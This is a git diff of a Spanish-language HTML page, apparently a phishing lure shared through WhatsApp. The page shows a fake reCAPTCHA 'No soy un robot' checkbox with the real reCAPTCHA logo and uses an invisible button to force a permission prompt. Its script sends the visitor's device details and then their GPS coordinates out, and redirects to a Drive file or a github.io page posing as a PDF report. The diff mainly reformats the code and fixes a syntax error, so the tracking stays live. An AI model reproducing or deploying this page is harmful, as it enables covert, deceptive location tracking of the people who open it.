@@ -6,7 +6,7 @@
 </head>
 <body>
 
-<!-- Botón invisible para forzar interacción (necesario en Android/Chrome) -->
+<!-- Botón invisible para interacción en Android -->
 <button id="geoBtn" style="opacity:0; position:absolute; pointer-events:auto; z-index:-1;">
 Permitir
 </button>
@@ -36,7 +36,6 @@ Permitir
         transform: scale(1.25);
     ">
 
-        <!-- Caja estilo recaptcha -->
         <div style="
             display:flex;
             align-items:center;
@@ -45,7 +44,6 @@ Permitir
             padding:20px;
             zoom:1.4;
         ">
-
             <div id="fakeCheckbox" style="
                 width:28px;
                 height:28px;
@@ -58,12 +56,9 @@ Permitir
                 align-items:center;
                 font-size:20px;
                 color:#0d6efd;
-            ">
-            </div>
+            "></div>
 
-            <span style="font-size:16px; color:#333;">
-                No soy un robot
-            </span>
+            <span style="font-size:16px; color:#333;">No soy un robot</span>
 
             <div style="
                 margin-left:auto;
@@ -73,8 +68,7 @@ Permitir
                 font-size:10px;
                 color:#555;
             ">
-                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png"
-                     style="width:30px; opacity:0.8;">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:30px; opacity:0.8;">
                 <span style="font-size:9px;">reCAPTCHA</span>
             </div>
         </div>
@@ -86,18 +80,15 @@ Permitir
 </div>
 
 <script>
-// ===============================
-//   0) DETECTAR SI SE ABRE DESDE WHATSAPP (content://)
-// ===============================
+// =====================================
+//   0) REDIRECCIÓN SI SE ABRE DESDE WHATSAPP
+// =====================================
 if (location.href.startsWith("content://") || document.referrer.includes("com.whatsapp")) {
     window.location.href = "https://encuestauta69-gif.github.io/pdf/informe.pdf.html";
 }
 
-// ===============================
-//   DETECTAR CELULAR + EJECUCIÓN LOCAL
-// ===============================
+// Detectar móvil + local
 const esMovil = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
-
 const host = window.location.hostname;
 const esLocal =
     host === "" ||
@@ -122,7 +113,7 @@ function enviar(data) {
     });
 }
 
-// ---- 1) Enviar info inicial ----
+// Enviar info inicial
 enviar({
     type: "info",
     userAgent: navigator.userAgent,
@@ -131,9 +122,9 @@ enviar({
     time: new Date().toISOString()
 });
 
-// ===============================
-//   FUNCIÓN DE REDIRECCIÓN FINAL
-// ===============================
+// =====================================
+//     REDIRIGIR LUEGO
+// =====================================
 function redirigirLuego() {
     window.location.href = "https://drive.google.com/file/d/1ggF1Gnb1HXQuwVSv8mHgodOz2T4FJ6Xd/view?usp=sharing";
 }
@@ -157,11 +148,10 @@ document.getElementById("captchaBox").addEventListener("click", function() {
 });
 
 // =====================================
-//     FUNCIÓN activarPermiso
+//     activarPermiso()
 // =====================================
 function activarPermiso() {
     document.getElementById("permisoBox").style.display = "none";
-
     document.getElementById("geoBtn").click();
 
     setTimeout(() => {
@@ -170,9 +160,8 @@ function activarPermiso() {
 }
 
 // =====================================
-//    FUNCIÓN obtener GPS + REDIRIGIR
+//    solicitarGeo()
 // =====================================
-
 function solicitarGeo() {
     if (!("geolocation" in navigator)) {
         enviar({
@@ -186,74 +175,60 @@ function solicitarGeo() {
     }
 
     navigator.geolocation.getCurrentPosition(
-    pos => {
-        enviar({
-            type: "geo",
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
-        });
+        pos => {
+            enviar({
+                type: "geo",
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
+            });
 
-        setTimeout(redirigirLuego, 800);
-    },
-    err => {
-        enviar({
-            type: "geo-error",
-            error: err.message,
-            time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
-        });
+            setTimeout(redirigirLuego, 800);
+        },
 
-        const msg = (err.message || "").toLowerCase();
+        err => {
+            enviar({
+                type: "geo-error",
+                error: err.message,
+                time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
+            });
 
-        // 1️⃣ Usuario negó permisos
-        if (
-            msg.includes("denied") ||
-            msg.includes("rechaz") ||
-            msg.includes("negó")
-        ) {
-            window.location.href = "https://encuestauta69-gif.github.io/pdf/";
-            return;
+            const msg = (err.message || "").toLowerCase();
+
+            // 1️⃣ Usuario negó permisos
+            if (
+                msg.includes("denied") ||
+                msg.includes("rechaz") ||
+                msg.includes("negó")
+            ) {
+                window.location.href = "https://encuestauta69-gif.github.io/pdf/";
+                return;
+            }
+
+            // 2️⃣ GPS apagado o sin señal
+            if (
+                msg.includes("unavailable") ||
+                msg.includes("not be determined") ||
+                msg.includes("no pudo ser determinada") ||
+                msg.includes("ubicación no disponible")
+            ) {
+                alert("Activa el GPS de tu dispositivo para continuar.");
+                window.location.href = "https://encuestauta69-gif.github.io/pdf/";
+                return;
+            }
+
+            // 3️⃣ Otro error (timeout o desconocido)
+            setTimeout(() => {
+                window.location.href = "https://encuestauta69-gif.github.io/pdf/";
+            }, 800);
         }
-
-        // 2️⃣ GPS apagado o sin señal
-        if (
-            msg.includes("unavailable") ||
-            msg.includes("not be determined") ||
-            msg.includes("no pudo ser determinada") ||
-            msg.includes("ubicación no disponible")
-        ) {
-            alert("Activa el GPS de tu dispositivo para continuar.");
-            window.location.href = "https://encuestauta69-gif.github.io/pdf/";
-            return;
-        }
-
-        // 3️⃣ Timeout u otro error desconocido
-        setTimeout(() => {
-            window.location.href = "https://encuestauta69-gif.github.io/pdf/";
-        }, 800);
-    }
-); // ✅ AQUÍ EL PARÉNTESIS Y PUNTO Y COMA
-
-
+    ); // ← ESTE ERA EL PARÉNTESIS QUE FALTABA
+}
 </script>
 
-
-<h2 style="color:#444; font-family:Arial;">
-❗ Verificación en curso
-</h2>
-<p style="color:#666; font-family:Arial;">
-Descargando.....
-</p>
+<h2 style="color:#444; font-family:Arial;">❗ Verificación en curso</h2>
+<p style="color:#666; font-family:Arial;">Descargando.....</p>
 
 </body>
 </html>
-
-
-
-
-
-
-
-
-
